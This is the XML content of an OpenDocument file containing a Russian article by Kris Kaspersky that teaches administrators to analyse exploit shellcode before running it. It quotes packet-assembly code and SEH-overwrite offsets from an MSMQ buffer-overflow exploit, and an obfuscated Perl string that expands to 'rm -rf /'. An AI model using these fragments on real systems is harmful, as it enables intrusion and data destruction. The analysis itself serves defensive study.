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9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Courier New" fo:font-size="8pt" style:font-name-asian="Wingding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language="en" fo:country="US" style:font-name-asian="Wingdings" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:color="#808080" style:font-name="Courier New" fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/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language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P15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16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num11">
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-indent="1.27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2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 style:font-name-asian="Wingdings" style:font-name-complex="Wingdings"/>
    </style:style>
    <style:style style:name="P25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2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2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6.35cm" fo:margin-right="0cm" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="1.27cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="8pt" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties style:font-name-asian="Wingdings" style:font-name-complex="Wingdings"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Название_20_объекта">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P33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34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Wingdings" style:font-weight-asian="bold" style:font-name-complex="Wingdings" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" fo:background-color="#ff0000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text:display="none"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" style:font-name-asian="Wingdings" style:font-name-complex="Wingdings"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" style:font-name-complex="Wingdings"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"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Wingdings" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:background-color="#ff0000"/>
    </style:style>
    <style:style style:name="T13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4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5" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T16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T17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18" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="8pt" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="8pt" style:font-name-asian="Wingdings" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:font-name="Courier New" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-weight="bold" style:font-weight-asian="bold" style:font-name-complex="Courier New" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T22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23" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:language="en" fo:country="US" style:font-name-complex="Courier New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text:display="none"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#808080"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="Courier New" fo:font-size="8pt" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="Courier New" fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T29" style:family="text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30" style:family="text"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font-name="Wingdings" fo:language="en" fo:country="US" style:font-name-asian="Wingdings" style:font-name-complex="Wingdings"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties style:font-name="Wingdings" fo:font-size="8pt" fo:language="en" fo:country="US" style:font-name-asian="Wingdings" style:font-size-asian="8pt" style:font-name-complex="Wingdings"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties style:font-name-asian="Wingdings"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties style:font-name-asian="Wingdings" style:font-name-complex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34" text:outline-level="1">аудит и дизассемблирование <text:span text:style-name="T1">exploit</text:span>'ов</text:h>
      <text:p text:style-name="Standard">крис касперски, <text:span text:style-name="T1">no</text:span>-<text:span text:style-name="T1">email</text:span></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P28"><text:span text:style-name="T2">exploit</text:span><text:span text:style-name="T10">'ы, демонстрирующие наличие дыры (</text:span><text:span text:style-name="T2">proof</text:span><text:span text:style-name="T10">-</text:span><text:span text:style-name="T2">of</text:span><text:span text:style-name="T10">-</text:span><text:span text:style-name="T2">concept</text:span><text:span text:style-name="T10">), обычно распространяются в исходных текстах, однако, основной функционал заключен в </text:span><text:span text:style-name="T2">shell</text:span><text:span text:style-name="T10">-коде, анализ которого представляет весьма нетривиальную задачу, требующую инженерного склада ума, развитой интуиции, обширных знаний и… знания специальных приемов дизассемблирования, о которых и пойдет речь в этой статье.</text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">введение</text:h>
      <text:p text:style-name="P22">Сообщения о дырах появляются постоянно. Стоит только заглянуть на <text:span text:style-name="T1">www</text:span>.securityfocus.com и… ужаснуться. Каждый день приносит по 10-20 новых дыр, затрагивающих практически весь спектр аппаратно-программного обеспечения. Вы до сих пор пользуетесь Лисом, считая его безопасным? Да как бы не так! За свое недолгое время существования он успел обрасти полусотней дыр, в том числе и критических. Ладно, оставим Лиса в покое и возьмем Оперу — почти два десятка ошибок (из которых 17 зарегистрировано на одном лишь securityfocus'е) быстро прочищают мозги от рекламной шелухи, позиционирующей Оперу не только как самый быстрый, но и по настоящему безопасный браузер. Уязвимости встречаются даже в текстовых браузуерах наподобие <text:span text:style-name="T1">Lynx</text:span>. Про <text:span text:style-name="T1">Internet</text:span> <text:span text:style-name="T1">Exploder</text:span> лучше вообще не вспоминать! Стоит ли после этого удивляться, что черви размножаются со скоростью лесного пожара и регулярно кладут целые сегменты сети, если не весь Интернет!</text:p>
      <text:p text:style-name="P22">Программное обеспечение ненадежно. Это факт! Предоставленное самому себе, без ухода и надзора администратора оно быстро становится жертвой хакерских атак, превращаясь в рассадник вирусов и червей. Если уязвимость затрагивает те компоненты системы, без которых можно в принципе и обойтись (например, <text:span text:style-name="T1">Message</text:span> <text:span text:style-name="T1">Queuing</text:span> или <text:span text:style-name="T1">RPC</text:span> <text:span text:style-name="T1">DCOM</text:span>), их можно отключить или оградить брандмауэром. В противном случае, необходимо установить заплатку от "родного" производителя или сторонних поставщиков. Проблема в том, что официальные обновления зачастую выпускается лишь через несколько месяцев после официального же признания дыры. А сколько дыр так и остаются "непризнанными"?</text:p>
      <text:p text:style-name="P22">Производителей программного обеспечения можно понять: ведь, прежде, чем признавать дыру дырой, необходимо убедиться, что это именно дыра, а вовсе не "авторское видение функциональности" и добиться устойчивого воспроизведения сбоя. У многих компаний существует политика замалчивания дыр и уязвимость либо молча устраняется с выходом очередной версии продукта (кумулятивного пакета обновления), либо не исправляется вообще! Яркий пример тому<text:span text:style-name="T1"> </text:span>— уязвимость "<text:span text:style-name="T1">MS</text:span> <text:span text:style-name="T1">IE</text:span> (<text:span text:style-name="T1">mshtml</text:span>.<text:span text:style-name="T1">dll</text:span>) <text:span text:style-name="T1">OBJECT</text:span> <text:span text:style-name="T1">tag</text:span> <text:span text:style-name="T1">vulnerability</text:span>", обнаруженная 23 апреля 2006 (см. lists.grok.org.uk/pipermail/full-disclosure/2006-April/045422.html), все еще не признанная <text:span text:style-name="T1">Microsoft</text:span>.</text:p>
      <text:p text:style-name="P22">Чтобы администратор мог спать спокойно и не дергался каждые пять минут, пытаясь обнаружить в логах брандмауэра "что-то необычное", первым делом необходимо выяснить — действительно ли вверенная ему система уязвима? Далеко не всем сообщениям о дырах можно верить. По общепринятой практике, первооткрыватель дыры должен подтвердить свои слова программой, демонстрирующий наличие уязвимости, но не совершающей ничего деструктивного. В зарубежной литературе она называется <text:span text:style-name="T1">exploit</text:span> <text:span text:style-name="T1">proof</text:span>-<text:span text:style-name="T1">of</text:span>-<text:span text:style-name="T1">concept</text:span>. Устоявшегося русского термина, увы, нет, поэтому приходится использовать то, что есть.</text:p>
      <text:p text:style-name="P22">Часто к <text:span text:style-name="T1">exploit</text:span>'у прилагается перечень тестируемых (<text:span text:style-name="T1">tested</text:span>) и уязвимых (<text:span text:style-name="T1">affected</text:span>) платформ и все, что необходимо сделать — это запустить <text:span text:style-name="T1">exploit</text:span> на своей системе и посмотреть, справится ли он с ней или нет. Естественно, атаковать "живой" сервер или основную рабочую станцию может только самоубийца (или очень безответственный человек) и все потенциально опасные эксперименты следует выполнять на "копии" сервера/рабочей станции, специально предназначенной для тестовых целей. Под <text:span text:style-name="T1">VM Ware</text:span> и другими эмуляторами подобного типа <text:span text:style-name="T1">exploit</text:span>'ы лучше не запускать. Во-первых, ряд вредоносных <text:span text:style-name="T1">exploit</text:span>'ов распознает наличие виртуальных машин и отказываются работать. Во-вторых, вырваться из застенок виртуальной машины вполне реально (<text:span text:style-name="T12">см. статью "побег из-под vm ware", которую можно скачать с моего мыщх'иного сервера </text:span><text:span text:style-name="T4">ftp</text:span><text:span text:style-name="T12">://</text:span><text:span text:style-name="T4">nezumi</text:span><text:span text:style-name="T12">.</text:span><text:span text:style-name="T4">org</text:span><text:span text:style-name="T12">.</text:span><text:span text:style-name="T4">ru</text:span><text:span text:style-name="T12">/</text:span><text:span text:style-name="T4">pub</text:span><text:span text:style-name="T12">/vm-escape.zip</text:span>).</text:p>
      <text:p text:style-name="P22">Отрицательный результат сам по себе еще ничего не доказывает. Даже если атака не удалась, у нас нет никаких оснований считать, что система находится в безопасности. <text:soft-page-break/>Возможно, это просто <text:span text:style-name="T1">exploit</text:span> такой кривой, но стоит его слегка подправить, как список поражаемых систем заметно возрастет (тем более, что большинство <text:span text:style-name="T1">exploit</text:span>'ов закладываются на фиксированные адреса, варьирующие от версии к версии, поэтому <text:span text:style-name="T1">exploit</text:span>, разработанный для английской версии <text:span text:style-name="T1">Windows </text:span>2000, может не работать в русской и наоборот).</text:p>
      <text:p text:style-name="P22">К сожалению, зеркальная копия сервера есть не у всех, а ее создание требует денег, времени и т.<text:span text:style-name="T1"> </text:span>д., поэтому сплошь и рядом <text:span text:style-name="T1">exploit</text:span>'ы запускаются на "живых" машинах. Но тогда хотя бы изучите код <text:span text:style-name="T1">exploit</text:span>'а, чтобы знать, что вы вообще запускаете, попутно устраняя ошибки, допущенные его разработчиками и адоптируя <text:span text:style-name="T1">shell</text:span>-код к своей системе, корректируя фиксированные адреса при необходимости.</text:p>
      <text:p text:style-name="P22">Формально, администратор не обязан быть программистом и знания ассемблера от него никто требовать не вправе, но... жизнь заставляет!</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">как препарируют <text:span text:style-name="T1">exploit</text:span>'ы</text:h>
      <text:p text:style-name="P22">Основной код <text:span text:style-name="T1">exploit</text:span>'а, как правило, пишется на переносимом высокоуровневом языке таком как Си/Си++, <text:span text:style-name="T1">Perl</text:span>, <text:span text:style-name="T1">Python</text:span>. Экзотика типа <text:span text:style-name="T1">Ruby</text:span> встречается намного реже, но все-таки встречается. В практическом плане это означает, что администратор должен владеть десятком популярных языков хотя бы на уровне беглого чтения листингов. Впрочем, в девяти из десяти случаев, ничего интересного в них не встречается, и весь боевой заряд концентрируется в "магических" строковых массивах, оформленных в стиле "\x55\x89\xE5…\xC7\x45\xFC". Вот это и есть <text:span text:style-name="T1">shell</text:span>-код в <text:span text:style-name="T1">ASCII</text:span>-представлении. Высокоуровневый код — всего лишь обертка, образно говоря, тетива или пусковая установка, а <text:span text:style-name="T1">shell</text:span>-код — разящие острие.</text:p>
      <text:p text:style-name="P22">Достаточно многие исследователи допускают роковую ошибку: анализируя <text:span text:style-name="T1">shell</text:span>-код, они забывают о том, что основной код может содержать вредоносные инструкции наподобие "rm -rf /". При знании языка, пакости подобного типа обнаруживаются без труда, если, конечно, злоумышленник не стремился воспрепятствовать анализу. Существует масса способов замаскировать вредоносный код в безобидные конструкции. Взять хотя бы строку '<text:span text:style-name="T13">$??</text:span><text:span text:style-name="T14">s</text:span><text:span text:style-name="T13">:;</text:span><text:span text:style-name="T14">s</text:span><text:span text:style-name="T13">:</text:span><text:span text:style-name="T14">s</text:span><text:span text:style-name="T13">;;$?::</text:span><text:span text:style-name="T14">s</text:span><text:span text:style-name="T13">;;=]=&gt;%-{&lt;-|}&lt;&amp;|`{;;</text:span><text:span text:style-name="T14">y</text:span><text:span text:style-name="T13">; -/:-@[-`{-};`-{/" -;;</text:span><text:span text:style-name="T14">s</text:span><text:span text:style-name="T13">;;$_;</text:span><text:span text:style-name="T14">see</text:span>', разворачиваемую <text:span text:style-name="T1">Perl</text:span>'ом в команду "<text:span text:style-name="T20">rm -rf /</text:span>", которая при запуске из-под <text:span text:style-name="T1">root</text:span>'а уничтожает все содержимое диска целиком.</text:p>
      <text:p text:style-name="P22">Отсюда вывод: <text:span text:style-name="T24">никогда не запускайте на выполнение код, смысла которого до конца не понимаете и уж тем более не давайте ему администраторских полномочий! Не поддавайтесь на провокацию!</text:span> Даже на авторитетных сайтах проскакивают <text:span text:style-name="T1">exploit</text:span>'ы, созданные с одной-единственной целью — отомстить если не всему человечеству, то хотя бы его части. Помните, что <text:span text:style-name="T24">самая большая дыра в системе — это человек, знающий пароль </text:span><text:span text:style-name="T5">root</text:span><text:span text:style-name="T24">'а (администратора) и запускающий на рабочей машине все без разбора!</text:span></text:p>
      <text:p text:style-name="P22">Больше на анализе базового кода мы останавливаться не будем (если вы знаете язык — это тривиально, если нет — не надейтесь, что автору удалось уложить многостраничные руководства в скромные рамки журнальной статьи).</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">анализ<text:span text:style-name="T1"> message queuing exploit'</text:span>а</text:h>
      <text:p text:style-name="P22"><text:span text:style-name="T25">Одного лишь знания ассемблера и </text:span><text:span text:style-name="T6">API</text:span><text:span text:style-name="T25">-операционной системы для исследования </text:span><text:span text:style-name="T6">shell</text:span><text:span text:style-name="T25">-кода будет явно недостаточно. Здесь все сложнее и… интереснее. </text:span>Продемонстрируем технику дизассемблирования <text:span text:style-name="T1">shell</text:span>-кода (со всеми сопутствующими ей приемами и трюками) на примере анализа "<text:span text:style-name="T1">Message</text:span> <text:span text:style-name="T1">Queuing</text:span> <text:span text:style-name="T1">Buffer</text:span> <text:span text:style-name="T1">Overflow</text:span> <text:span text:style-name="T1">Vulnerability</text:span> <text:span text:style-name="T1">Universal</text:span>" <text:span text:style-name="T1">exploit</text:span>'а (<text:span text:style-name="T1">http</text:span>://<text:span text:style-name="T1">milw</text:span>0<text:span text:style-name="T1">rm</text:span>.<text:span text:style-name="T1">com</text:span>/<text:span text:style-name="T1">exploits</text:span>/1075), прилагаемого к статье в файле 1075. Базовый код, написанный на языке Си, рассматривать не будем, а сразу перейдем к <text:span text:style-name="T1">shell</text:span>'у.</text:p>
      <text:p text:style-name="P22">Самое сложное — это определить точку входа в <text:span text:style-name="T1">shell</text:span>-код, то есть ту точку, которой будет передано управление при переполнении. В данном случае нам повезло и создатель <text:span text:style-name="T1">exploit</text:span>'а структурировал листинг, разбив двоичные данные на шесть массивов, первые четыре из которых (<text:span text:style-name="T22">dce</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">rpc</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">header</text:span><text:span text:style-name="T21">1</text:span>, <text:span text:style-name="T22">tag</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">private</text:span>, <text:span text:style-name="T22">dce</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">rpc</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">header</text:span><text:span text:style-name="T21">2</text:span> и <text:span text:style-name="T22">dce</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">rpc</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">header</text:span><text:span text:style-name="T21">3</text:span>) представляют собой заголовки <text:span text:style-name="T1">RPC</text:span>-пакетов, в которых для нас нет ничего интересного.</text:p>
      <text:p text:style-name="P22">А вот массив <text:span text:style-name="T22">offsets</text:span> включает в себя ключевые структуры данных, передающие управление на <text:span text:style-name="T1">shell</text:span>-код. Способ передачи основан на подмене <text:span text:style-name="T1">SEH</text:span>-фреймов по усовершенствованной методике, обходящей защиту от переполнения, появившуюся в <text:span text:style-name="T1">Windows </text:span>2000, <text:span text:style-name="T1">Windows </text:span>XP и <text:span text:style-name="T1">Server </text:span>2003. И хотя это не отражено в комментариях явным образом (создатели <text:span text:style-name="T1">shell</text:span>-кодов традиционно неразговорчивы), опытные кодокопатели распознают подложные фреймы с первого взгляда (тем более, что кое-какие комментарии там все-таки присутствуют, но даже если бы их и не было, это не сильно бы затруднило анализ).</text:p>
      <text:p text:style-name="P22">Основная часть <text:span text:style-name="T1">shell</text:span>-кода (расположенная в массиве <text:span text:style-name="T21">bind_shellcode</text:span>) системно независима (ну, почти), а все фиксированные адреса вынесены в массив <text:span text:style-name="T23">offset</text:span>, который при <text:soft-page-break/>тестировании под различными версиями операционных систем имеет наглость требовать "ручной" коррекции. Даже при наличии не залатанной дыры <text:span text:style-name="T1">exploit</text:span> может не работать только потому, что по фиксированным адресам расположено не то, что ожидалось. Но, прежде, чем приступать к анализу массива <text:span text:style-name="T23">offsets</text:span>, необходимо определить его местоположение в пакете-убийце, вызывающим переполнение. Приведенный ниже фрагмент базового кода собирает все массивы в непрерывный буфер, передаваемый на атакуемый сервер:</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P1"><text:span text:style-name="T28">// </text:span><text:span text:style-name="T27">выделяем память</text:span></text:p>
      <text:p text:style-name="P4">buff = (char *) malloc(4172); memset(buff, NOP, 4172); ptr = buff;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P1"><text:span text:style-name="T28">// RPC-</text:span><text:span text:style-name="T27">заголовки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T15">memcpy(ptr,dce_rpc_header1,sizeof(dce_rpc_header1)-1);ptr+=sizeof(dce_rpc_header1)-1;</text:span></text:p>
      <text:p text:style-name="P4">memcpy(ptr, tag_private, sizeof(tag_private)-1);<text:tab/>ptr+=sizeof(tag_private)-1;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">memcpy(buff+1048, <text:s text:c="2"/>dce_rpc_header2, sizeof(dce_rpc_header2)-1);</text:p>
      <text:p text:style-name="P4">memcpy(buff+1048*2, dce_rpc_header2, sizeof(dce_rpc_header2)-1);</text:p>
      <text:p text:style-name="P4">memcpy(buff+1048*3, dce_rpc_header3, sizeof(dce_rpc_header3)-1);</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P11">// offsets</text:p>
      <text:p text:style-name="P6">ptr=buff;ptr+=438;</text:p>
      <text:p text:style-name="P4">memcpy(ptr, offsets, sizeof(offsets)-1);ptr += sizeof(offsets)-1;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P11">// shellcode</text:p>
      <text:p text:style-name="P4">memcpy(ptr, bind_shellcode, sizeof(bind_shellcode)-1);</text:p>
      <text:p text:style-name="P32">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг0" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">1</text:sequence><text:span text:style-name="T1"> </text:span>фрагмент <text:span text:style-name="T1">exploit</text:span>'а, ответственный за сборку пакета-убийцы</text:p>
      <text:p text:style-name="P22">Вначале пакета (<text:span text:style-name="T12">см. рис. 1</text:span>) располагается <text:span text:style-name="T1">RPC</text:span>-заголовок <text:span text:style-name="T20">dce_rpc_header1</text:span>, за ним идет NetBIOS-имя атакуемого узла и тег <text:span text:style-name="T20">private</text:span>. На некотором отдалении от начала заголовка, по смещению 438 (1<text:span text:style-name="T1">B</text:span>6<text:span text:style-name="T1">h</text:span>) лежит массив <text:span text:style-name="T23">offsets</text:span>, сразу за концом которого идет <text:span text:style-name="T1">shell</text:span>-код. Далеко за ним обнаруживается еще один <text:span text:style-name="T1">RPC</text:span>-заголовок <text:span text:style-name="T20">dce_rpc_header2</text:span> и <text:span text:style-name="T20">dce_rpc_header3</text:span> (на рисунке не показан). Все остальное пространство пакета заполнено командами <text:span text:style-name="T1">NOP</text:span> (90<text:span text:style-name="T1">h</text:span>).</text:p>
      <text:p text:style-name="P22">Процесс формирования пакета хорошо наблюдать под отладчиком (в данном случае использовался <text:span text:style-name="T1">Microsoft</text:span> <text:span text:style-name="T1">Visual</text:span> <text:span text:style-name="T1">Studio</text:span> <text:span text:style-name="T1">Debugger</text:span>) или перехватить уже готовый пакет <text:span text:style-name="T1">sniffer</text:span>'ом.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P32">Рисунок <text:sequence text:ref-name="refDrawing0" text:name="Drawing" text:formula="ooow:Drawing+1" style:num-format="1">1</text:sequence> устройство пакета-убийцы, передаваемого на атакуемый сервер</text:p>
      <text:p text:style-name="P22">Сразу же возникает вопрос — в каком именно месте возникает переполнение и каким именно образом происходит передача управления на <text:span text:style-name="T1">shell</text:span>-код? Запустив <text:span text:style-name="T1">MSMQ</text:span>-службу под отладчиком, мы увидим, что массив <text:span text:style-name="T23">offsets</text:span> ложится аккурат поверх <text:span text:style-name="T1">SEH</text:span>-фрейма, подменяя его содержимое, а <text:span text:style-name="T1">shell</text:span>-код затирает адрес возврата из функции, заменяя <text:span text:style-name="T1">RET</text:span> произвольным адресом, указывающим в "космос", при обращении к которому возбуждается исключение и… управление получает подложный <text:span text:style-name="T1">SEH</text:span>-фрейм, передающий управление на <text:span text:style-name="T1">shell</text:span>-код. Все просто! Главное — отладчик иметь! И… установленную службу <text:span text:style-name="T1">Message</text:span> <text:span text:style-name="T1">Queuing</text:span>, которой в распоряжении кодокопателя может и не быть. К тому же мы договорились, прежде чем запускать <text:span text:style-name="T1">exploit</text:span> (пусть даже под отладчиком!) сначала реконструировать его алгоритм.</text:p>
      <text:p text:style-name="P22">А как мы его можем реконструировать? Хорошая головоломка для знатоков! Отбросив <text:span text:style-name="T1">RPC</text:span>-заголовки, мы остаемся только с массивом <text:span text:style-name="T23">offsets</text:span> и <text:span text:style-name="T1">shell</text:span>-кодом. Очевидно, смещение массива <text:span text:style-name="T23">offsets</text:span> выбрано не случайно и играет в переполнении ведущую роль, поскольку <text:span text:style-name="T20">bind_shellcode</text:span> представляет собой вполне "стандартный" shell-код, встречающийся во многих других <text:span text:style-name="T1">exploit</text:span>'ах и совпадающий с ним байт-в-байт.</text:p>
      <text:p text:style-name="P22">Рассмотрим массив <text:span text:style-name="T23">offsets</text:span> поближе: </text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P4">unsigned char offsets[] =</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">/* entry point (jmp over) */</text:span><text:span text:style-name="T15"><text:tab/><text:tab/><text:tab/>; // </text:span><text:span text:style-name="T16">SEH-FRAME for Windows 2000</text:span></text:p>
      <text:p text:style-name="P4">"\xEB\x08\x90\x90"<text:tab/><text:tab/><text:tab/><text:tab/>; // ! *prev | jmp lab_0Ah <text:s text:c="3"/>!</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">/* mqsvc.exe - pop reg; pop reg; retn; */</text:span><text:span text:style-name="T15"><text:tab/>; // !------------------------!</text:span></text:p>
      <text:p text:style-name="P4">"\xE9\x14\x40\x00"<text:tab/><text:tab/><text:tab/><text:tab/>; // ! <text:s/>*handler <text:s text:c="13"/>!</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>; // !------------------------!</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P1"><text:span text:style-name="T28">"\x90\x90\x90\x90\x90\x90\x90\x90"</text:span><text:span text:style-name="T29"><text:tab/><text:tab/>; // </text:span><text:span text:style-name="T30">подбор</text:span><text:span text:style-name="T29"> SEH-</text:span><text:span text:style-name="T30">фрейма</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T30">для</text:span><text:span text:style-name="T29"> w2k server</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P4">/* :LAB_0Ah */</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">/* entry point (jmp over) */</text:span><text:span text:style-name="T15"><text:tab/><text:tab/><text:tab/>; // </text:span><text:span text:style-name="T16">SEH-FRAME for W2K Server/AdvServer</text:span></text:p>
      <text:p text:style-name="P4">"\xEB\x08\x90\x90"<text:tab/><text:tab/><text:tab/><text:tab/>; // ! *prev | jmp lab_1Ah <text:s text:c="11"/>!</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">/* mqsvc.exe - pop reg; pop reg; retn; */</text:span><text:span text:style-name="T15"><text:tab/>; // !----------------- --------------!</text:span></text:p>
      <text:p text:style-name="P4"><text:soft-page-break/>"\xE9\x14\x40\x00"<text:tab/><text:tab/><text:tab/><text:tab/>; // ! <text:s/>*handler <text:s text:c="21"/>!</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>; // !--------------------------------!</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P1"><text:span text:style-name="T28">"\x90\x90\xEB\x1A\x41\x40\x68\x6F\x75\x73"<text:tab/>; </text:span><text:span text:style-name="T29">// </text:span><text:span text:style-name="T30">подбор</text:span><text:span text:style-name="T29"> SEH-</text:span><text:span text:style-name="T30">фрейма</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T30">для</text:span><text:span text:style-name="T29"> XP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">"\x65\x6F\x66\x64\x61\x62\x75\x73\x48\x41"<text:tab/>; </text:span><text:span text:style-name="T29">// "A@houseofdabusHA"</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">/* :LAB_1Ah */</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">/* entry point (jmp over) */<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T15">; // </text:span><text:span text:style-name="T16">SEH-FRAME for Windows XP</text:span></text:p>
      <text:p text:style-name="P4">"\xEB\x06\x90\x90"<text:tab/><text:tab/><text:tab/><text:tab/>; // ! *prev | jmp lab_36h <text:s/>!</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T28">/* mqsvc.exe - pop reg; pop reg; retn; */</text:span><text:span text:style-name="T15"><text:tab/>; // !----------------------!</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T15">"\x4d\x12\x00\x01"<text:tab/><text:tab/></text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15"><text:tab/>; // ! <text:s/>*handler <text:s text:c="11"/>!</text:span></text:p>
      <text:p text:style-name="P29">; // !----------------------!</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1"><text:span text:style-name="T30">"\</text:span><text:span text:style-name="T29">x</text:span><text:span text:style-name="T30">90\</text:span><text:span text:style-name="T29">x</text:span><text:span text:style-name="T30">90\</text:span><text:span text:style-name="T29">x</text:span><text:span text:style-name="T30">90\</text:span><text:span text:style-name="T29">x</text:span><text:span text:style-name="T30">90\</text:span><text:span text:style-name="T29">x</text:span><text:span text:style-name="T30">90\</text:span><text:span text:style-name="T29">x</text:span><text:span text:style-name="T30">90";<text:tab/><text:tab/><text:tab/>; // не значащие </text:span><text:span text:style-name="T29">NOP</text:span><text:span text:style-name="T30">'ы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">/* :</text:span><text:span text:style-name="T15">LAB</text:span><text:span text:style-name="T18">_36</text:span><text:span text:style-name="T15">h</text:span><text:span text:style-name="T18"> */</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">=== отсюда начинается актуальный </text:span><text:span text:style-name="T15">shell</text:span><text:span text:style-name="T18">-код ===</text:span></text:p>
